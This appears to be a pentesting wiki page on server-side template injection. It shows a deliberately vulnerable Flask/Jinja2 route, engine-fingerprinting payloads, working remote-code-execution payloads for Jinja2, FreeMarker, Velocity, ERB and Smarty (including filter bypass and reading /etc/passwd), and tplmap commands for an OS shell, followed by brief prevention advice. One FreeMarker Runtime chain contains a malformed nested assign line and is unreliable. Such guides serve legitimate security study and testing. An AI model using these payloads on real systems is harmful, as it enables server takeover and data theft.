---
sidebar_position: 40
---
# SSTI (Server-Side Template Injection)

Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can inject malicious template syntax into an application, which the server then processes and executes. This allows the attacker to execute arbitrary code, manipulate data, or gain full control over the server. SSTI arises when user-supplied input is directly embedded into a template without proper sanitization, and that template is subsequently rendered server-side.

## How SSTI Works

Many web applications use server-side template engines (e.g., Jinja2, Twig, FreeMarker, Velocity, ERB, Blade) to dynamically generate HTML pages by combining static templates with dynamic data. If an application incorrectly handles user input, allowing it to be placed directly into a template, an attacker can inject template syntax. When the server renders this modified template, it executes the injected code, leading to SSTI.

**Example of Vulnerable Code (Python/Jinja2):**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    # Vulnerable: User input directly embedded into the template string
    template = f"Hello, {name}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```
If an attacker sends a request like `http://localhost:5000/hello?name={{7*7}}`, the `template` string becomes `Hello, {{7*7}}!`. When Jinja2 renders this, it evaluates `{{7*7}}` and the output becomes `Hello, 49!`, confirming the injection.

## Why SSTI is Critical

*   **Remote Code Execution (RCE)**: The most severe impact, as attackers can execute arbitrary commands on the server.
*   **Information Disclosure**: Access sensitive server-side data, environment variables, or configuration files.
*   **File System Access**: Read or write files on the server.
*   **Denial of Service (DoS)**: Crash the application or server by injecting resource-intensive template code.

## Detecting and Exploiting SSTI

The key to detecting and exploiting SSTI is to:
**Identify the injection point**: Where user input is reflected in the rendered page.  
**Test for template syntax**: Use generic and then engine-specific payloads.  
**Identify the template engine**: Based on the response to test payloads.  
**Craft RCE payloads**: Using the specific syntax and available functions/objects of the identified engine.  

### Generic Detection Payloads

Start by trying to break out of the template context and perform a simple mathematical operation. A successful evaluation (e.g., `49` appearing) confirms SSTI.

#### Payloads
*   `{{7*7}}`
*   `${7*7}`
*   `#{7*7}`
*   `<%= 7*7 %>`
*   `{{'7'*'7'}}` (Checks for string concatenation vs. multiplication)
*   `{{ 1+1 }}`
*   `{{ 1*'1' }}` (Differentiates between engines)
*   `{{"".__class__.__bases__[0].__subclasses__()}}` (Python template engines - attempts to get class hierarchy)

### Identifying the Template Engine

Once a generic payload confirms injection, refine it to pinpoint the specific template engine. Different engines will interpret syntax differently.

#### Jinja2 / Twig / Nunjucks (Python/PHP/Node.js - similar syntax)
*   `{{7*7}}` -> `49`
*   `{{'7'*'7'}}` -> `49` (Jinja2), `'7777777'` (Twig), `7777777` (Nunjucks)
*   `{{ [1,2,3]|join(',') }}` -> `1,2,3`

#### FreeMarker (Java)
*   `${7*7}` -> `49`
*   `${"7"*"7"}` -> `49`
*   `#{7*7}` -> `49`  

#### Velocity (Java)
*   `#set($foo=7*7)$foo` -> `49`
*   `${7*7}` -> `49`
#### ERB (Ruby)
*   `<%= 7*7 %>` -> `49`   

#### Smarty (PHP)
*   `{7*7}` -> `49`
#### Blade (PHP - Laravel)
*   `{{7*7}}` -> `49` (Often protected against simple RCE)  

#### Pug (formerly Jade - Node.js)
*   `#{7*7}` -> `49`

### Exploiting for Remote Code Execution (RCE)

RCE payloads are highly dependent on the identified template engine and the language it's built upon. The goal is often to access objects that allow arbitrary code execution, such as:
*   Python's `__class__.__bases__[0].__subclasses__()` chain.
*   Java's `Runtime` object.
*   Ruby's `Kernel` module.
*   PHP's `system()` or `passthru()` functions.

#### Jinja2 / Twig (Python/PHP - assuming Python for example)
The common approach is to escape the sandbox by accessing core Python objects.

*   **Basic RCE payload (for Linux, to run `id`):**
    ```jinja2
    {{ "".__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}
    ```
    *   *Note*: The index `[134]` can vary between Python versions and environments. You might need to enumerate `"".__class__.__bases__[0].__subclasses__()` to find a suitable class (e.g., `subprocess.Popen` or similar).

*   **Alternative for `os` import:**
    ```jinja2
    {{ config.items()[4]['\x5f\x5fclass\x5f\x5f'].\x5f\x5fmro\x5f\x5f[1].\x5f\x5fsubclasses\x5f\x5f()[268].\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen('id').read() }}
    ```
    *   *Note*: The obfuscation (`\x5f`) and indices (`[268]`) are to bypass potential filters.

*   **Read `/etc/passwd`:**
    ```jinja2
    {{ ''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read() }}
    ```
    *   *Note*: Index `[40]` typically points to `file` or `_io.TextIOWrapper`.

#### FreeMarker (Java)
FreeMarker allows access to Java objects.

*   **Basic RCE payload (to run `id`):**
    ```freemarker
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
    ```
    *   *Explanation*: This creates an instance of `freemarker.template.utility.Execute` (if available and allowed) and then uses it to run system commands.

*   **If `Execute` is not available, try `Runtime`:**
    ```freemarker
    <#assign classLoader=object?api.class.classLoader>
    <#assign method=classLoader.loadClass("java.lang.Runtime").getMethod("getRuntime",null)>
    <#assign runtime=method.invoke(null,null)>
    <#assign process=runtime.exec("id")>
    <#assign is=process.getInputStream()>
    <#assign reader=classLoader.loadClass("java.io.BufferedReader").<#assign constructor=classLoader.loadClass("java.io.InputStreamReader").getConstructor(classLoader.loadClass("java.io.InputStream"))>
    <#assign isr=constructor.newInstance(is)>
    <#assign br=classLoader.loadClass("java.io.BufferedReader").getConstructor(classLoader.loadClass("java.io.Reader")).newInstance(isr)>
    <#assign line=br.readLine()>
    ${line}
    ```
    *   *Explanation*: A more complex chain to get to `java.lang.Runtime.exec()`.

#### Velocity (Java)
Velocity also allows access to Java objects.

*   **Basic RCE payload (to run `id`):**
    ```velocity
    #set($e="java.lang.Runtime".getClass().getMethod("getRuntime",null).invoke(null,null).exec("id"))
    #set($input=$e.getInputStream())
    #set($reader=new "java.io.BufferedReader"(new "java.io.InputStreamReader"($input)))
    #foreach($line in $reader.lines()) $line #end
    ```

#### ERB (Ruby)
ERB allows direct Ruby code execution.

*   **Basic RCE payload (to run `id`):
    ```erb
    <%= system('id') %>
    <%= `id` %>
    <%= %x{id} %>
    ```

#### Smarty (PHP)
Smarty often allows PHP function execution.

*   **Basic RCE payload (to run `id`):
    ```smarty
    {system('id')}
    {php}system('id');{/php}
    ```
    *   *Note*: The `{php}` tag is often disabled in production.

## Tools for Detection & Exploitation

### Burp Suite (Manual & Extensions)
*   **Repeater**: Manually send SSTI payloads and observe responses.
*   **Intruder**: Use a custom wordlist of SSTI payloads for various engines. Look for differences in response length or content.
*   **Extensions**: The Burp BApp Store has extensions specifically designed for SSTI detection and payload generation (e.g., "Tplmap" (though sometimes outdated), "SSTI Scanner").
*   **Tplmap**: An open-source tool dedicated to detecting and exploiting SSTI vulnerabilities.
    *   **Basic Usage**:
        ```bash
        tplmap -u "http://example.com/vulnerable?name=test" --os-shell
        tplmap -u "http://example.com/vulnerable?name=test" --os-cmd "id"
        ```
        *   **`-u`**: Target URL.
        *   **`-d`**: POST data.
        *   **`--os-shell`**: Attempt to get an interactive OS shell.
        *   **`--os-cmd`**: Execute a single OS command.
        *   **`--data`**: Specify POST data for injection.
        *   **`--detect-engine`**: Attempt to detect the template engine.
### Manual Reconnaissance 
Inspect HTTP headers (e.g., `X-Powered-By`), error messages, and public documentation to infer the backend language and potential template engine.

## Prevention (Briefly)

**Never Embed User Input Directly into Templates**: The most critical defense. Always pass user input as data to the template engine, not as part of the template string itself.  
**Use Sandbox Environments**: Configure template engines to run in a restricted sandbox where dangerous functions are disabled.  
**Input Validation & Sanitization**: Filter potentially malicious characters and syntax from user input before it reaches any templating context.  
**Principle of Least Privilege**: Run the application with minimal permissions, limiting the impact of a successful RCE.  